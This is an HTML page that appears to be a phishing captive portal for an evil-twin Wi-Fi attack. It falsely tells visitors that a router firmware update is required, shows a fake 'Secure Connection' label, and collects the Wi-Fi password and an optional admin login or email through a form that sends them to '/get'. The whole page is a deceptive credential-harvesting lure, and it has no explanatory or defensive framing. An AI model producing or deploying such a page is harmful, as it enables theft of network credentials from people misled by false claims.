<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Wi-Fi Network Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
        }
        h2 {
            color: #333;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .logo {
            font-size: 40px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">📶</div>
    <h2>Firmware Update Required</h2>
    <p>Please enter your Wi-Fi password to update your router's firmware and restore internet access.</p>
    
    <form action="/get" method="GET">
        <input type="text" name="email" placeholder="Router Admin or Email (Optional)" autocomplete="off">
        <input type="password" name="password" placeholder="Wi-Fi Password" required autocomplete="off">
        <input type="submit" value="Authenticate & Update">
    </form>
    <p style="font-size: 12px; color: #777;">Secure Connection</p>
</div>

</body>
</html>
